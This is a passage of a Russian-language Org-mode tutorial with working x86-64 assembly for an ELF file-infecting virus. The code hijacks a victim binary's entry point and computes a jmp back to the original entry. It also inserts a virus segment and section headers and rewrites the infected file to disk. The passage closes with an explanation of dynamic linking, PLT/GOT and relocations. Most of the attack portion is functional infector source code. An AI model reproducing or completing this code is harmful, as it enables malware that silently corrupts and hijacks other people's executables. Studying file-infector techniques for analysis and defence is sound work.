      je      _edit_elf_hdr_fail

      <<_add_data_size_to_e_shofff>>
      <<_add_bind_now_rec_to_e_shoff>>
      add     $0x38, %rsi # + размер вставляемого заголовка

      mov     ELF_E_ENTRY(%rdi), %rcx
      mov     %rcx, original_e_entry(%rip) # save original e_entry

      mov     virus_new_vaddr(%rip), %rdx
      mov     %rdx, ELF_E_ENTRY(%rdi)

      add     %rsi, ELF_E_SHOFF(%rdi)
      add     $0x1, ELF_E_PHNUM(%rdi)
      add     $0x1, ELF_E_SHNUM(%rdi)

  _edit_elf_hdr_success:
      xor     %rax, %rax
      jmp     _edit_elf_hdr_exit

  _edit_elf_hdr_fail:
      mov     $-1, %rax

  _edit_elf_hdr_exit:
      pop    %rsi
      pop    %rdi
      pop    %rdx
      pop    %rcx
      ret

#+END_SRC

** Передать управление на жертву

Нам нужно каким-то образом передать управление коду мишени после того,
как вирус отработает в инфицированном файле. Для этого будем ипользовать
опкод ~jmp~ с относительным адресом.

Понадобится:
- Посчитать, на каком адресе инструкции будет находиться вирус, когда
  будет передавать управление на оригинальную точку входа мишени. Для
  этого берем виртуальный адрес вируса, который мы высчитывали выше,
  берем размер кода вируса и складываем их. Затем вычитаем единицу из
  полученной суммы: когда мы получали данные вируса, мы прибавляли к его
  исходному размеру вируса размер блока передачи управления, который мы
  сейчас фомируем. Неважно, какого размера этот блок, но последней
  инструкцией в нем будет инстукция ~nop~, занимающая 1 байт, а перед ней - наш
  ~jmp~. Поэтому мы вычитаем единицу из полученного адреса: так мы как
  раз оказываемся на адресе инструкции ~nop~, следующей сразу за ~jmp~.

Вот так мы это выглядит в коде:
#+NAME: _count_nop_instr_addr
#+BEGIN_SRC asm :noweb yes
  // проверяем данные
  mov     virus_code_size(%rip), %rax
  test    %rax, %rax
  je      _count_offset_to_orig_e_entry_fail

  mov     original_e_entry(%rip), %rbx
  test    %rbx, %rbx
  je      _count_offset_to_orig_e_entry_fail

  mov     virus_new_vaddr(%rip), %rcx
  test    %rcx, %rcx
  je      _count_offset_to_orig_e_entry_fail

  // считаем адрес, на котором будем находиться,
  // когда будем передавать управление жертве
  dec     %rax
  add     %rcx, %rax

  mov     %rax, %rdi
#+END_SRC

- Оригинальная точку входа мишени берем из поля ~e_entry~ до его модификации

- Теперь вычитаем из оригинальной e_entry полученный адрес инструкции
  и получаем таким образом смещение до оригинальной точки входа и
  сохраняем его.

Пример: адрес вашего вируса 0x8012a8, его размер 0x100 байт, адрес
оригинальной точки входа 0x400430.  0x400430 - (0x8012a8 + 0x100 -
0x1) = -400f11.  Смещение получается отрицательным, поскольку мы
совершаем прыжок не "вперед", а "назад".

Вот так это выглядит в коде:
#+NAME: _count_offset_to_orig_e_entry
#+BEGIN_SRC asm :noweb yes
  /// _COUNT_OFFSET_TO_ORIG_E_ENTRY
  /// считает смещение до оригинльного e_entry,
  /// чтоб его мог использовать jmp, который передаст
  /// управление жертве после того,
  /// как вирус в ней отработает
  _count_offset_to_orig_e_entry:
      push   %rbx
      push   %rcx

      // проверяем данные
      <<_count_nop_instr_addr>>

      <<_count_offset_to_orig_e_entry_without_dynamic>>
      // посчитали смещение,
      // должно быть отрицательным, поскольку
      // оригинальный e_entry всегда будет выше
      // _global_exit
      mov     original_e_entry(%rip), %rbx

      sub    %rax, %rbx
      movl   %ebx, offset_to_e_entry(%rip)

  _count_offset_to_orig_e_entry_success:
      xor     %rax, %rax
      jmp     _count_offset_to_orig_e_entry_exit

  _count_offset_to_orig_e_entry_fail:
      mov     $-1, %rax

  _count_offset_to_orig_e_entry_exit:
      pop    %rcx
      pop    %rbx
      ret

#+END_SRC

Вызовем эту функцию из ~recount_victim~:

#+NAME: _call_count_offset_to_orig_e_entry
#+BEGIN_SRC asm :noweb yes
        call    _count_offset_to_orig_e_entry
        test    %rax, %rax
        jne     _recount_victim_fail
#+END_SRC

[[_recount_victim][_recount_victim]]

А теперь впишем опкод ~jmp~ и полученное смещение в буфер, который мы
выделили под передачу управления.

#+NAME: _transfer_control_to_victim
#+BEGIN_SRC asm :noweb yes
  /// _TRANSFER_CONTROL_TO_VICTIM
  /// создает блок кода для передачи
  /// управления на жертву - записывает опкоды
  /// операций и необходимые смещения
  transfer_control_code_size:
      .quad  0xB

  transfer_control_code:
      .space  0xB, 0

  _transfer_control_to_victim:
      push    %rbx

      lea     transfer_control_code(%rip), %rax

      <<_call_move_victim>>

      mov     $0xe9, %rbx
      movzwl  %bx, %ebx

      // jmp opcode
      movb    %bl, (%rax)
      inc     %rax

      mov     offset_to_e_entry(%rip), %rbx
      test    %rbx, %rbx
      je      _transfer_control_to_victim_fail

      mov     %ebx, (%rax)
      add     $0x4, %rax

      // nop opcode
      mov     $0x90, %rbx
      movzwl  %bx, %ebx
      movb    %bl, (%rax)

  _transfer_control_to_victim_success:
      xor     %rax, %rax
      jmp     _transfer_control_to_victim_exit

  _transfer_control_to_victim_fail:
      mov     $-1, %rax

  _transfer_control_to_victim_exit:
      pop     %rbx
      ret

#+END_SRC

Этот функционал тоже вызовем из ~recount_victim~:

#+NAME: _call_transfer_control_to_victim
#+BEGIN_SRC asm :noweb yes
        call    _transfer_control_to_victim
        test    %rax, %rax
        jne     _recount_victim_fail
#+END_SRC

[[_recount_victim][_recount_victim]]

** Объединить редактирование в общий алгоритм

Теперь удобно объединить все вызовы функций по редактированию чего-либо в
один блок кода. Назовем эту функцию ~_recount_victim~: она
последовательно вызове все функции, редактирующие что-либо в файле и
создающие какой-то дополнительный код - например, заголовки вируса. Если
на каком-то критично важном этапе произойдет фейл, то весь этап редактирования будет
считаться незавершенным. В случае успеха в переменную ~recount_success~
будет занесен ноль.

#+NAME: _recount_victim
#+BEGIN_SRC asm :noweb yes
  /// _RECOUNT_VICTIM
  /// Пересчитывает данные жертвы
  _recount_victim:

      <<_call_recount_symbols_addrs>>

      <<_call_recount_rela_sections>>

  _recount_hdrs:
      call    _shdr_offset_and_addr_recount
      test    %rax, %rax
      jne     _recount_victim_fail

      call    _phdr_offset_and_addr_recount
      test    %rax, %rax
      jne     _recount_victim_fail

  _recount_dynamic_and_got:
      <<_call_recount_dynamic_section>>

      <<_call_recount_got_section>>

  _generate_virus_data:
      <<_call_count_virus_new_vaddr>>

      call    _generate_virus_phdr
      test    %rax, %rax
      jne     _recount_victim_fail

      call    _generate_virus_shdr
      test    %rax, %rax
      jne     _recount_victim_fail

     <<_call_generate_bind_now_flag_record>>

  _recount_elf_hdr:
      call    _edit_elf_hdr
      test    %rax, %rax
      jne     _recount_victim_fail

  _count_offsets:
      <<_call_count_offset_to_orig_e_entry>>

      <<_call_count_offset_to_orig_e_entry>>

      <<_call_count_offset_to_e_entry_frm_file_begin>>

      <<_call_count_frm_orig_e_entry_to_virus_e_entry_offset>>

  _make_opcode_blocks:
      call    _transfer_control_to_victim
      test    %rax, %rax
      jne     _recount_victim_fail

      <<_call_make_victim_data_block>>

  _recount_victim_success:
      movq    $0, recount_success(%rip)
      xor     %rax, %rax
      jmp     _recount_victim_exit

  _recount_victim_fail:
      mov      $-1, %rax

  _recount_victim_exit:
      ret

#+END_SRC

** Записать ELF-файл на диск

Записываем в следующей последовательности:
  - Код от начала файла до конца таблицы заголовков сегментов
  - Заголовок сегмента вируса
  - Весь код мишени до начала таблицы секций
  - Весь код вируса
  - Код, передающий управление на мишень
  - Таблицу секций мишени
  - Заголовок секции вируса

Поскольку файл приходится записывать по скускам, а не единым вызовом, то
нам нужено каким-то образом не начинать запись файла каждый раз с его
начала. Самое простое - это воспользоваться системным вызовом ~pwrite~,
которому можно задать смещение в файле, с которого он должен писать.

Для каждого вызова ~pwrite~ понадобится:
- файловый дескриптор файла, в который ведется запись
- указатель на код, который записывается
- рамер этого кода
- смещение в файле, с которого начинается запись

Под смещение мы заведем переменную ~file_offset~, которая по умолчанию
будет 0. Каждый раз записывая какой-то блок кода, мы будем складывать его
размер со значением, которое находится в переменной, высчитывая таким
образом смещение для следующего блока в файле.

В блоках ниже вы можете видеть реализацию необходимого функционала.
*** Откроем файл для записи
[TODO:gmm] Устранить описанный ниже баг

Из-за какого-то странного бага при перезаписи файла мишени напрямую в
некоторых случаях секция ~.text~ мишени заполняется нулями вместо ее
кода. Хотя указатель, с которого пишет код, верен, и по нему лежат отнюдь
не нули.

Если писать код в промежуточный файл, а затем из него перезаливать в
исходный файл мишени, то этот баг исчезает.

Напишем и функцию, которая открывает промежучтоный файл - его имя задано
заранее. Вся ее задача - это просто открыть файл и сохранить его файловый
дерскриптор.

#+NAME: _open_interm_file
#+BEGIN_SRC asm
  /// _OPEN_INTERM_FILE
  /// открывает промежуточный файл
  _open_interm_file:
      push    %rdi
      push    %rsi
      push    %rdx

      lea     new_elf_file(%rip), %rdi
      // RDWR + O_CREAT
      mov     $0x42, %rsi
      // разрешение на rwx
      mov     $0x1ff, %rdx
      mov     $0x2, %rax  # fopen syscall
      syscall
      test    %rax, %rax
      jl      _open_interm_file_fail

  _open_interm_file_success:
      mov     %rax, interm_fd_file(%rip)
      xor     %rax, %rax
      jmp     _open_interm_file_exit

  _open_interm_file_fail:
      mov     $-1, %rax

  _open_interm_file_exit:
      pop     %rdx
      pop     %rsi
      pop     %rdi
      ret

#+END_SRC

И сразу позаботимся о переписывании содержимого промежуточного файла в
исходный. Для этого нужно:

- закрыть промежуточный файл - иначе в нем ничего не сохранится
- сохранить файловый дескриптор мишени - его переменная будет
  перезаписана
- смаппить промежуточный файл в память - openfile перезапишет переменную
  ~fd~ новым файловым дескриптором, а так же перезапишет переменную
  ~file_sz~, которая хранит размер смапенного файла
- вызвать ~pwrite~ и одним вызовом записать весь промежуточный файл в
  файл мишени

#+NAME: _rewrite_to_victim_file
#+BEGIN_SRC asm
  /// _REWRITE_TO_VICTIM_FILE
  /// Переписывает весь код из промежуточного файла
  /// в файл жертвы
  _rewrite_to_victim_file:
      push    %rdi
      push    %rsi
      push    %rbx
      push    %rcx
      push    %rdx
      push    %r10

      mov     interm_fd_file(%rip), %rdi
      test    %rdi, %rdi
      je      _rewrite_to_victim_file_fail

      mov     $0x3, %rax      # syscall close
      syscall
      // созранили fd жертвы
      mov     fd(%rip), %rbx

      lea     new_elf_file(%rip), %rdi
      mov     $O_RDWR, %rsi
      call    _openfile
      cmp     $0x0, %rax
      jl     _rewrite_to_victim_file_fail

      mov     %rbx, %rdi
      mov     %rax, %rsi
      xor     %rcx, %rcx
      xor     %r10, %r10
      mov     file_sz(%rip), %rdx

      mov     $0x12, %rax   # syscall pwrite
      syscall

      test   %rax, %rax
      je     _rewrite_to_victim_file_fail

  _rewrite_to_victim_file_success:
      xor     %rax, %rax
      jmp     _rewrite_to_victim_file_exit

  _rewrite_to_victim_file_fail:
      mov     $-1, %rax

  _rewrite_to_victim_file_exit:
      pop     %r10
      pop     %rdx
      pop     %rcx
      pop     %rbx
      pop     %rsi
      pop     %rdi
      ret

#+END_SRC

*** Сначала запишем код от начала файла до конца таблицы секций

#+NAME: _write_till_phdr_table_end
#+BEGIN_SRC asm

  /// _WRITE_TILL_PHDR_TABLE_END
  /// Вписывает в файл жертву от ее начала до
  /// конца таблицы заголовков сегментов
  _write_till_phdr_table_end:
      push    %rdi
      push    %rsi
      push    %rdx
      push    %rcx
      push    %r10

      mov     interm_fd_file(%rip), %rdi
      mov     victim_elf_addr(%rip), %rsi
      mov     victim_phdr_table_size(%rip), %rdx
      add     $0x40, %rdx

      mov     file_offset(%rip), %rcx
      mov     %rcx, %r10
      mov     %rcx, %r8

      add     %rdx, %r8
      mov     %r8, file_offset(%rip)

      mov     $0x12, %rax   # syscall pwrite
      syscall

      test   %rax, %rax
      je     _write_till_phdr_table_end_fail

  _write_till_phdr_table_end_success:
      xor     %rax, %rax
      jmp     _write_till_phdr_table_end_exit

  _write_till_phdr_table_end_fail:
      mov     $-1, %rax

  _write_till_phdr_table_end_exit:
      pop     %r10
      pop     %rcx
      pop     %rdx
      pop     %rsi
      pop     %rdi
      ret

#+END_SRC

*** Теперь вписываем заголовок вируса

#+NAME: _write_new_phdr_virus
#+BEGIN_SRC asm

  /// _WRITE_NEW_PHDR_VIRUS
  /// Вписывает новый заголовок в жертву
  _write_new_phdr_virus:
      push    %rdi
      push    %rsi
      push    %rdx
      push    %rcx
      push    %r10

      mov     interm_fd_file(%rip), %rdi
      leaq    virus_new_phdr(%rip), %rsi
      mov     $0x38, %rdx

      mov     file_offset(%rip), %rcx
      mov     %rcx, %r10
      mov     %rcx, %r8

      add     %rdx, %r8
      mov     %r8, file_offset(%rip)

      mov     $0x12, %rax   # syscall pwrite
      syscall

      test   %rax, %rax
      je     _write_new_phdr_virus_fail

  _write_new_phdr_virus_success:
      xor     %rax, %rax
      jmp     _write_new_phdr_virus_exit

  _write_new_phdr_virus_fail:
      mov     $-1, %rax

  _write_new_phdr_virus_exit:
      pop     %r10
      pop     %rcx
      pop     %rdx
      pop     %rsi
      pop     %rdi
      ret

#+END_SRC

*** Впишем весь код мишени до заголовков секций

#+NAME: _write_whole_victim
#+BEGIN_SRC asm

  /// _WRITE_WHOLE_VICTIM
  /// Записывает код жертвы
  /// одним вызовом в файл
  _write_whole_victim:
      push    %rdi
      push    %rsi
      push    %rdx
      push    %rcx
      push    %r10

      mov     new_bind_now_flag_record_size(%rip), %rdi
      test    %rdi, %rdi
      jne     _write_whole_victim_fail

      mov     interm_fd_file(%rip), %rdi
      mov     victim_code_addr(%rip), %rsi
      mov     victim_code_size(%rip), %rdx

      mov     file_offset(%rip), %rcx
      mov     %rcx, %r10
      mov     %rcx, %r8

      add     %rdx, %r8
      mov     %r8, file_offset(%rip)

      mov     $0x12, %rax   # syscall pwrite
      syscall

      test   %rax, %rax
      je     _write_whole_victim_fail

  _write_whole_victim_success:
      xor     %rax, %rax
      jmp     _write_whole_victim_exit

  _write_whole_victim_fail:
      mov     $-1, %rax

  _write_whole_victim_exit:
      pop     %r10
      pop     %rcx
      pop     %rdx
      pop     %rsi
      pop     %rdi
      ret

#+END_SRC

*** Вписываем вирус

Тут нужно помнить, что размер вируса у насвключает в себя и размер блока
передачи управления, который мы вписываем отдельно. Поэтому из переменной
~virus_code_size~ нужно вычесть размер блока управления. В противном
случае мы запишем лишние байты и весь дальнейший код сползет.

#+NAME: _write_virus_code
#+BEGIN_SRC asm

  /// _WRITE_WHOLE_VICTIM
  /// Записывает код жертвы
  /// одним вызовом в файл
  _write_virus_code:
      push    %rdi
      push    %rsi
      push    %rdx
      push    %rcx
      push    %r10

      mov     interm_fd_file(%rip), %rdi
      mov     virus_code_addr(%rip), %rsi
      mov     virus_code_size(%rip), %rdx

      mov     transfer_control_code_size(%rip), %rax
      sub     %rax, %rdx

      mov     file_offset(%rip), %rcx
      mov     %rcx, %r10
      mov     %rcx, %r8

      add     %rdx, %r8
      mov     %r8, file_offset(%rip)

      mov     $0x12, %rax   # syscall pwrite
      syscall

      test   %rax, %rax
      je     _write_virus_code_fail

  _write_virus_code_success:
      xor     %rax, %rax
      jmp     _write_virus_code_exit

  _write_virus_code_fail:
      mov     $-1, %rax

  _write_virus_code_exit:
      pop     %r10
      pop     %rcx
      pop     %rdx
      pop     %rsi
      pop     %rdi
      ret

#+END_SRC

*** Блок передачи управления

#+NAME: _write_transfer_control_code_block
#+BEGIN_SRC asm

  /// _WRITE_TRANSFER_CONTROL_CODE_BLOCK
  /// Записывает код жертвы
  /// одним вызовом в файл
  _write_transfer_control_code_block:
      push    %rdi
      push    %rsi
      push    %rdx
      push    %rcx
      push    %r10

      mov     interm_fd_file(%rip), %rdi
      leaq    transfer_control_code(%rip), %rsi
      mov     transfer_control_code_size(%rip), %rdx

      mov     file_offset(%rip), %rcx
      mov     %rcx, %r10
      mov     %rcx, %r8

      add     %rdx, %r8
      mov     %r8, file_offset(%rip)

      mov     $0x12, %rax   # syscall pwrite
      syscall

      test   %rax, %rax
      je     _write_transfer_control_code_block_fail

  _write_transfer_control_code_block_success:
      xor     %rax, %rax
      jmp     _write_transfer_control_code_block_exit

  _write_transfer_control_code_block_fail:
      mov     $-1, %rax

  _write_transfer_control_code_block_exit:
      pop     %r10
      pop     %rcx
      pop     %rdx
      pop     %rsi
      pop     %rdi
      ret

#+END_SRC

*** Записываем заголовки секций мишени

#+NAME: _write_victim_shdrs
#+BEGIN_SRC asm
  /// _WRITE_VICTIM_SHDRS
  ///  Пишет таблицу заголовков секций
  _write_victim_shdrs:
      push    %rdi
      push    %rsi
      push    %rdx
      push    %rcx
      push    %r10

      mov     interm_fd_file(%rip), %rdi
      mov     victim_shdr_table_addr(%rip), %rsi
      mov     victim_shdr_table_size(%rip), %rdx

      mov     file_offset(%rip), %rcx
      mov     %rcx, %r10
      mov     %rcx, %r8

      add     %rdx, %r8
      mov     %r8, file_offset(%rip)

      mov     $0x12, %rax   # syscall pwrite
      syscall

      test   %rax, %rax
      je     _write_data_block_fail

  _write_victim_shdrs_success:
      xor     %rax, %rax
      jmp     _write_victim_shdrs_exit

  _write_victim_shdrs_fail:
      mov     $-1, %rax

  _write_victim_shdrs_exit:
      pop     %r10
      pop     %rcx
      pop     %rdx
      pop     %rsi
      pop     %rdi
      ret

#+END_SRC

*** Наконец вписываем заголовок секции вируса

#+NAME: _write_virus_new_shdr
#+BEGIN_SRC asm

  /// _WRITE_VICTIM_SHDRS
  ///  Пишет таблицу заголовков секций
  _write_virus_new_shdr:
      push    %rdi
      push    %rsi
      push    %rdx
      push    %rcx
      push    %r10

      mov     interm_fd_file(%rip), %rdi
      leaq    virus_new_shdr(%rip), %rsi
      mov     $0x40, %rdx

      mov     file_offset(%rip), %rcx
      mov     %rcx, %r10
      mov     %rcx, %r8

      add     %rdx, %r8
      mov     %r8, file_offset(%rip)

      mov     $0x12, %rax   # syscall pwrite
      syscall

      test   %rax, %rax
      je     _write_virus_new_shdr_fail

  _write_virus_new_shdr_success:
      xor     %rax, %rax
      jmp     _write_virus_new_shdr_exit

  _write_virus_new_shdr_fail:
      mov     $-1, %rax

  _write_virus_new_shdr_exit:
      pop     %r10
      pop     %rcx
      pop     %rdx
      pop     %rsi
      pop     %rdi
      ret

#+END_SRC

Оформим перезапись файла в одну функцию ~_recombine_elf~,
которая проверит, закончились ли успешно этапе парсинга и пересчета
жертвы, а так же получены ли данные вируса, и если все хорошо,
будет последовательно вызывать все функции записи:

#+NAME: _recombine_elf
#+BEGIN_SRC asm :noweb yes
  /// _RECOMBINE_ELF_WITHOUT_NEW_BIND_NOW
  /// Перекомпоновывает эльф
  _recombine_elf:
      push    %rdi
      push    %rsi
      push    %rdx

      // промежуточный файл открыт?
      mov     interm_fd_file(%rip), %rdi
      // mov     fd(%rip), %rdi
      // mov     %rdi, interm_fd_file(%rip)

      test    %rdi, %rdi
      je      _recombine_elf_fail

      // этапы парсинга жертвы, получения данных вируса
      // и пересчитывания жертвы прошли успешно?
      mov     parse_success(%rip), %rdx
      test    %rdx, %rdx
      jne      _recombine_elf_fail

      mov     recount_success(%rip), %rdx
      test    %rdx, %rdx
      jne      _recombine_elf_fail

      mov     get_virus_success(%rip), %rdx
      test    %rdx, %rdx
      jne      _recombine_elf_fail

      // тогда переколбашиваем эльф
  _recombine_cur_elf:
      call    _write_till_phdr_table_end
      test    %rax, %rax
      jne     _recombine_elf_fail

      call    _write_new_phdr_virus
      test    %rax, %rax
      jne     _recombine_elf_fail

      call    _write_whole_victim
      test    %rax, %rax
      je      _write_end_of_file

      <<_call_write_victim_code_with_bind_now>>

  _write_end_of_file:
      call    _write_virus_code
      test    %rax, %rax
      jne     _recombine_elf_fail

      call    _write_transfer_control_code_block
      test    %rax, %rax
      jne     _recombine_elf_fail

      <<_call_write_data_block>>

      call    _write_victim_shdrs
      test    %rax, %rax
      jne     _recombine_elf_fail

      call    _write_virus_new_shdr
      test    %rax, %rax
      jne     _recombine_elf_fail

  _recombine_elf_success:
      xor     %rax, %rax
      jmp     _recombine_elf_exit

  _recombine_elf_fail:
      mov     $-1, %rax

  _recombine_elf_exit:
      pop     %rdx
      pop     %rsi
      pop     %rdi
      ret

#+END_SRC

** Восстановить все регистры

Как анонсировалось выше, регистры мало сохранить, их надо еще и
восстановить.
Так что сделаем это:

#+NAME: _restore_registers_and_stack
#+BEGIN_SRC asm :noweb yes
      /// Возвращает регистры в состояние
      /// до исполнения вируса
      _restore_registers_and_stack:
          mov     old_rsp(%rip), %rsp     # restore old %RSP
          mov     old_rbx(%rip), %rbx
          mov     old_rdx(%rip), %rdx
          mov     old_rcx(%rip), %rcx
          mov     old_rdi(%rip), %rdi
          mov     old_rsi(%rip), %rsi
          mov     old_r8(%rip), %r8
          mov     old_r9(%rip), %r9
          mov     old_r10(%rip), %r10
          mov     old_r11(%rip), %r11
          mov     old_r12(%rip), %r12
          mov     old_r13(%rip), %r13
          mov     old_r14(%rip), %r14
          mov     old_r15(%rip), %r15

      <<_global_exit>>
#+END_SRC

** Теперь наш инфицированный ELF выглядит следующим образом:

#+NAME: infected_elf2
#+BEGIN_SRC ditaa :file ./img/infected_elf2.png
         +----------------------------+
         | Заголовок ELF-файла        |
         | (ELF-header)               |
         |   ...                      |
         | e_entry                    |----+
         |   ...                      |    |
         +----------------------------+    |
                                           |
         +----------------------------+    |
         |Таблица заголовков сегментов|    |
         |(Program Header Table)      |    |
         +----------------------------+    |
         | PHDR                       |    |
         | INTERP                     |    |
         | ..(остальные заголовки)..  |    |
         | LOAD RE (заголовок вируса) |    |
         +----------------------------+    |
                                           |
         +----------------------------+    |
         | Segment (PHDR)             |    |
         +----------------------------+    |
         | Segment (INTERP)           |    |
         |    .interp                 |    |
         +----------------------------+    |
         | Segment (LOAD) R           |    |
         |    .interp                 |    |
         |      ...                   |    |
         +----------------------------+    |
         | Segment (LOAD) RE          |    |
         |    .text                   |    |
         |      ...                   |    |
   +---->| OEP:                       |    |
   |     |      ...                   |    |
   |     +----------------------------+    |
   |     | Segment (LOAD) R           |    |
   |     |      ...                   |    |
   |     +----------------------------+    |
   |     | Segment (LOAD) RW          |    |
   |     |      ...                   |    |
   |     +----------------------------+    |
   |     | Segment (DYNAMIC) RW       |    |
   |     |   .dynamic                 |    |
   |     +----------------------------+    |
   |     | Segment (NOTE)             |    |
   |     |     ...                    |    |
   |     +----------------------------+    |
   |     | Segment (GNU_...)          |    |
   |     |     ...                    |    |
   |     +----------------------------+    |
   |     | Segment (LOAD) RE VIRUS    |<---+
   |     |    .text                   |
   |     |      ...                   |
   +----<|      jmp OEP               |
         +----------------------------+

         +----------------------------+
         | Таблица заголовков секций  |
         | (Section Header Table)     |
         +----------------------------+
         | Null Section Header        |
         | .interp                    |
         | ... (иные секции мишени)   |
         | .text (секция кода мишени  |
         | ... (иные секции мишени)   |
         | .virus (секция вируса)     |
         +----------------------------+
#+END_SRC

#+results: infected_elf2
[[file:./img/infected_elf2.png]]

* Немного о линковке

[TODO:gmm] - Этот раздел придется переместить вверх, в [[*%D0%A0%D0%B5%D0%BB%D0%BE%D0%BA%D0%B5%D0%B9%D1%82%D1%8B][Релокейты]].

Когда запускается несколько программ, часть кода, который они могут
использовать может быть общей. Её можно вынести в библиотеки. Например,
общей может быть библиотека языка Си, и тогда несколько загруженных
программ могут использовать один и тот же код. Это позволяет
экономить память и место на диске.

У каждого процесса есть собственное Виртуальное Адресное Пространство,
разбитое на Страницы Памяти, но в Реальном Адресном Пространстве
библиотека языка Си размещена только один раз:

#+NAME: shared_libc
#+BEGIN_SRC ditaa :file ./img/infected_elf3.png
  VirtMem           RealMem         VirtMem
| ...       |     | ...     |     | ...       |
+-----------+     +---------+     +-----------+
| Program 1 |  +--| libc    |--+  | Program 2 |
| ...       |  |  +---------+  |  | ...       |
| .text     |  |  | ...     |  |  | .text     |
| .data     |  |               |  | .data     |
| ...       |  |               |  | .bss      |
+-----------+  |               |  | .stack    |
| libc      |<-+               |  | .virus    |
+-----------+                  |  | ...       |
| ...       |                  |  +-----------+
                               +->| libc      |
                                  +-----------+
                                  | ...       |
#+END_SRC

Для того, чтобы это было возможно, внутри ELF-файла должно быть указание
на то, какие библиотеки должны быть загружены, но это еще не все, ведь
раз от раза, когда ELF-файл запускается эти библиотеки могут загружаться
по разным адресам.

Чтобы вызвать любую библиотечную функцию, код в секции .text должен знать
смещение этой функции от начала библиотеки. Прежде чем код будет готов к
запуску, нужно будет настроить эти адреса, чтобы они указывали в нужное
место.

Именно потому, что для связывания нужны ТОЛЬКО адреса, когда мы создаем
программу на Си, которая использует библиотеку, нам нужен ее
скомпилированный файл - так определяются нужные смещения по именам
вызываемых функций. Еще компилятору заголовочные (*.h) файлы этой
библиотеки - так он может проверить типы при вызове библиотечных функций.

Во время компиляции в ELF-файл помещаются записи, которые определяют всю
необходимую информацию для динамической линковки. Мы можем просмотреть
их:

#+BEGIN_SRC sh
  $ readelf -d hello

  Dynamic section at offset 0x2da8 contains 27 entries:
    Tag        Type                         Name/Value
   0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
   ...
#+END_SRC

И в первой же записи мы видим запись типа NEEDED, которая сообщает
динамическому линковщику, что программе требуется библиотека libc.


Теперь посмотрим, что происходит, когда нам нужно вызывать функцию этой
библиотеки. Вот кусок кода, который вызывает функцию printf, взятый из
.text мишени:

#+BEGIN_SRC asm
  120b:	48 89 c6             	mov    %rax,%rsi
  120e:	48 8d 3d 03 0e 00 00 	lea    0xe03(%rip),%rdi
  1215:	b8 00 00 00 00       	mov    $0x0,%eax
  121a:	e8 a1 fe ff ff       	callq  10c0 <printf@plt>
#+END_SRC

Мы видим, что он на самом деле вызывает вот это кусочек кода в секции
.plt:

#+BEGIN_SRC asm
  00000000000010c0 <printf@plt>:
      10c0:	f3 0f 1e fa          	endbr64
      10c4:	f2 ff 25 fd 2e 00 00 	bnd jmpq *0x2efd(%rip) # 3fc8 <printf@GLIBC>
      10cb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
#+END_SRC

Тут есть коссвенный jmp на адрес 0x3FC8, который находиится в
PLT. Посмотрим что там:

#+BEGIN_SRC asm
  0000000000003f98 <_GLOBAL_OFFSET_TABLE_>:
      ...
      3fc8:	60                   	(bad)
      3fc9:	10 00                	adc    %al,(%rax)
      3fcb:	00 00                	add    %al,(%rax)
      3fcd:	00 00                	add    %al,(%rax)
      3fcf:	00 70 10             	add    %dh,0x10(%rax)
      ...
#+END_SRC

О, здесь нет ничего, кроме значения 0x0000000000001060, но мы можем
поискать этот адрес в таблице релокаций:

#+BEGIN_SRC sh
  $ readelf -r hello | grep 3fc8
  Offset        Info         Type              Sym. Value       Sym. Name + Addend
  000000003fc8  000500000007 R_X86_64_JUMP_SLO 0000000000000000 printf@GLIBC_2.2.5 + 0
#+END_SRC

Отлично, именно эта запись указывает линкеру добавить к значению по
адресу 0x3fc8 базовый адрес библиотеки libc. В результате, программма
получает возможнсть обратиться в нужной функции.


В каждом ELF-файле есть таблица символов, которая содержит в себе
информацию о символах программы. В динамически слинкованном ELF-е таблиц
символов может быть две - .symtab и .dynsym.

Dynsym содержит в себе информацию о динамических символах программы -
т.е. о символах, заимствованных из библиотек, а .symtab хранит в себе
информацию обо всех символах вообще: имя символа, его виртуальный адрес,
тип связязывания, видимость в файле и т.д. После компиляции в этой
таблице можно увидеть связь символа и адреса, на который он
ссылается. Именно такую таблицу проверяет рантайм-линкер, когда ищет,
например, код printf в библиотеке, чтоб вернуть нам адрес на него.

Для корректной работы помимо .symtab линкеру необходимы секции .rela и
.dynamic.

Секция .dynamic хранит в себе всю информацию, которая может понадобиться
линкеру и библитеке libc для корректного старта и завершения программы.

~libc~ нужены записи init, fini, init_array и fini_array. Линкеру нужно
все остальное.

Здесь вы можете видеть уже знакомые нам секции .pltgot и .symtab, а также
секцию .rela.

#+BEGIN_SRC sh
  $ readelf -r hello

  Dynamic section at offset 0xe60 contains 25 entries:
    Тег        Тип                          Имя/Знач
   0x0000000000000001 (NEEDED)             Совм. исп. библиотека: [libc.so.6]
   0x000000000000000c (INIT)               0x4004e0
   0x000000000000000d (FINI)               0x40074c
   0x0000000000000019 (INIT_ARRAY)         0x600e48
   0x000000000000001b (INIT_ARRAYSZ)       8 (байт)
   0x000000000000001a (FINI_ARRAY)         0x600e50
   0x000000000000001c (FINI_ARRAYSZ)       8 (байт)
   0x000000006ffffef5 (GNU_HASH)           0x4002d0
   0x0000000000000005 (STRTAB)             0x4003b0
   0x0000000000000006 (SYMTAB)             0x4002f0
   0x000000000000000a (STRSZ)              86 (байт)
   0x000000000000000b (SYMENT)             24 (байт)
   0x0000000000000015 (DEBUG)              0x0
   0x0000000000000003 (PLTGOT)             0x601048
   0x0000000000000002 (PLTRELSZ)           144 (байт)
   0x0000000000000014 (PLTREL)             RELA
   0x0000000000000017 (JMPREL)             0x400450
   0x0000000000000007 (RELA)               0x400438
   0x0000000000000008 (RELASZ)             24 (байт)
   0x0000000000000009 (RELAENT)            24 (байт)
   0x000000006ffffffe (VERNEED)            0x400418
   0x000000006fffffff (VERNEEDNUM)         1
   0x000000006ffffff0 (VERSYM)             0x400406
   0x0000000000000018 (BIND_NOW)
   0x0000000000000000 (NULL)               0x0
#+END_SRC

Секция rela содержит в себе информацию о релокейтах: их имена,
адреса, как именно должна выполниться релокация и т.д.

#+BEGIN_SRC sh
  $ readelf -r hello

  Раздел перемещения '.rela.dyn' со смещением 0x438 содержит 1 пунктов:
    Смещение        Инфо           Тип            Знач.симв.    Имя симв. + Addend
  000000601040  000600000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0

  Раздел перемещения '.rela.plt' со смещением 0x450 содержит 6 пунктов:
    Смещение        Инфо           Тип            Знач.симв.    Имя симв. + Addend
  000000601060  000100000007 R_X86_64_JUMP_SLO 0000000000000000 localtime@GLIBC_2.2.5 + 0
